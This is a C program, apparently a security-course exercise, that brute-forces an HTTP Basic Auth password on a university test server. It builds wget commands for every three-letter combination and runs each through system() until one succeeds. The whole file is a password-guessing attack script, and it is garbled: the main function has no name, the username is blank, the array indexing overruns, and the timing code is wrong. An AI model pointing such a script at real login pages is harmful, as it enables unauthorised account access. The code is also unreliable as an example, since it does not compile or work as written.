#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <sys/time.h>
#include <strings.h>
#include <ctype.h>

int ()
{
  char url[80], url1[80];
  int i, j, k, syst = 1, nofattempts = 0;
  char c1, c2, c3, pass[4];
  int time_var,time1,time2, timeinsec;
  time1 = time();

  char itoa[52] = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";

  strcpy(url, "wget --http-user= --http-passwd=");
  strcpy(url1, " http://sec-crack.cs.rmit.edu./SEC/2/ -o out.txt");

  for (i = 1; i <= 52; i++)
  {
    for (j = 1; j <= 52; j++)
    {
      for (k = 1; k <= 52; k++)
      {
          fflush(stdin);
          c1 = itoa[i];
          c2 = itoa[j];
          c3 = itoa[k];
          pass[0] = c1;
          pass[1] = c2;
          pass[2] = c3;
    	  pass[3] = '\0';
          strcat(url, pass);
          strcat(url, url1);
	      ++nofattempts;
          syst = system(url);
          printf("%s\n",pass);
          if (syst == 0)
          {
            time2 = time();
            time_var = time2 - time1;
            timeinsec = time_var / 1000000000;
            printf("  Number of Attempts  is %d", nofattempts);
            printf("\n Found it! The Password is: %s\n", pass);
            printf("\n The time_var taken  crack the password by brute force is %lld seconds\n", timeinsec);
            exit(1);
          }
	      strcpy(url, "");
    	  strcpy(url, "wget --http-user= --http-passwd=");
      }
    }
  }
  exit(0);
}
